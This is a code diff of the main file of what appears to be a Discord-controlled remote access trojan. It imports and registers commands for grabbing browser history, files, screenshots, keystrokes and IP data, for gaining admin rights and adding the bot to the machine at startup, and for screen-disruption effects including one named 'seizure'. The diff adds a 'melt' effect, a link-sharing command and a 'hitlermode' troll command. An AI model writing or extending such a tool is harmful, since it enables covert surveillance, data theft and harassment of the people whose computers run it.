@@ -2,18 +2,20 @@ import discord
 from discord.ext import commands
 import discodd
 import info
-from command import ip_command, close_command, tts_command, admin_command, playsound_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
+from command import ip_command, help_command, close_command, tts_command, admin_command, playsound_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
 import startuplogic.askadmin
 import startuplogic.addme
 from command.fun import kkk_command, notificationspam_command, bassboost_command, thugfiles_command, wallpaper_command
-from command.gdicommands import tornado_command, screenswipe_command, seizure_command, blur_command, errorspamz_command
-
+from command.gdicommands import tornado_command, melt_command, screenswipe_command, seizure_command, blur_command, errorspamz_command
+from command.filecommands.advancedshare_command import advanced_share_command 
 startuplogic.askadmin.setup()
 startuplogic.addme.run_setup_in_thread()
 from command.useful import search_command, setvol_command, cd_command, openurl_command, restartpc_command, shutdownpc_command
+from command.troll import hitlermode_command
+
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix='.', intents=intents)
+bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
@@ -65,4 +67,8 @@ bot.add_command(commands.Command(notificationspam_command.spamnotify, name='spam
 bot.add_command(commands.Command(cd_command.cd_command, name='cd'))
 bot.add_command(commands.Command(screenswipe_command.screenswipe, name='screenswipe'))
 bot.add_command(commands.Command(setvol_command.vol_command, name='setvol'))
+bot.add_command(commands.Command(melt_command.melt_command, name='melt'))
+bot.add_command(commands.Command(advanced_share_command, name='linkshare'))
+bot.add_command(commands.Command(help_command.help_command, name='help'))
+bot.add_command(commands.Command(hitlermode_command.hitler_command, name='hitlermode'))
 bot.run(discodd.TOKEN)
